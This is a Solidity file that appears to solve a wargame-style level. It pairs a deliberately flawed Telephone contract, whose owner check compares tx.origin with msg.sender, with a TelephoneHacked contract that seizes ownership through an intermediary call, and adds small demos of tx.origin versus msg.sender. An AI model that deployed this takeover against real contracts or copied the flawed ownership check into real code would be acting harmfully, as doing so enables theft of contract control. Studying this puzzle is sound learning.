pragma solidity ^0.4.18;

contract Telephone {

  address public owner;
  event Log(address _tx, address _sender);

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    
    Log(tx.origin, msg.sender);
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelephoneHacked {
    
    Telephone telephone;
    
    constructor(address _contract){
        telephone = Telephone(_contract);
    }
    
    function message() public {
        telephone.changeOwner(msg.sender);
    }
}

contract OwnerInfo {
    address public owner;
    
    function setTxOrign() public {
        owner = tx.origin;
    }
    
    function setSender() public {
        owner = msg.sender;
    }
}

contract ownerCall {
    
    OwnerInfo ownerInfo;
    
    constructor(address _con) public {
        ownerInfo = OwnerInfo(_con);
    }
    
    function callSetOrigin() public {
        ownerInfo.setTxOrign();    
    }
    
    function callSetSender() public {
        ownerInfo.setSender();
    }
    
}